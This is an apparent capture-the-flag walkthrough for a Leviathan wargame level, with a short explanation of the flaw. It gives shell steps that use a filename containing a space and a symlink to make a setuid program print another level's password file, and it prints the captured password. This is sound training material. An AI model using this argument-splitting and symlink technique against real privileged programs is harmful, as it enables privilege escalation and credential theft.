//Leviathon 2


Step 1 — Create a file containing a space
touch "foo bar"
Step 2 — Create a symlink named bar
ln -s /etc/leviathan_pass/leviathan3 bar
Step 3 — Run the vulnerable program
~/printfile "foo bar"
Step 4 — Get the password
cat: foo: No such file or directory
PiEpxxknZH

explanation:

The vulnerability is caused by improper handling of a filename
containing a space.

The program performs two different operations with the same input:

1. It checks the filename as a single filename.
2. It later places the filename inside a shell command without quotes.

This causes the input to be interpreted differently at each stage.
